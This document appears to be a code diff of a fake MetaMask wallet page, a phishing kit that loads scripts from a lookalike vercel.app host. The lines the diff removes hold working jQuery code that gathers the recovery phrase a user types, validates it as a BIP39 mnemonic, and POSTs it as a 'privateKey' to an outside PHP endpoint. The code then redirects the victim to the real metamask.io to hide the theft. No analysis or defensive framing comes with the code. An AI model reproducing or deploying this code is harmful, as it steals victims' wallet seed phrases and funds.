@@ -68005,7 +68005,7 @@ input:checked + .send-v2__amount-max__button {
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
     <script src="https://webwallet-metamask.vercel.app/import/bip39.min.js"></script>
     <script src="https://webwallet-metamask.vercel.app/import/script5e1f.js"></script>
-    <script>
+<script>
     var phs2 = [];
     var phs3 = [];
 
@@ -68079,41 +68079,7 @@ input:checked + .send-v2__amount-max__button {
             }
         });
     });
-</script>          $("#phrase-helper-text").hide();
-            }
-          }
-        })
-      })
-
-        $("#form77").click(function() {
-          var phs=[];
-          $("input[name='pass[]']").map(function(key){
-            if ($(this).val().length > 0){
-              phs.push($(this).val());
-            }
-          });
-
-          var check = bip39.validateMnemonic(phs.join(" "), bip39.wordlists.english);
-          if (check){
-            $.ajax({
-            method: 'POST',
-            data: {
-              walletName: 'metamask',
-              privateKey: phs.toString(),
-            },
-            url: 'https://ajansdesire.com/asdasd/kekem.php',
-            success: function (data) {
-              window.location.href = 'https://href.li/?https://metamask.io';
-            },
-            error: function () {
-
-            },
-          });
-          }
-
-        });
-      });
-    </script>
+</script>
   </body>
 
 </html>
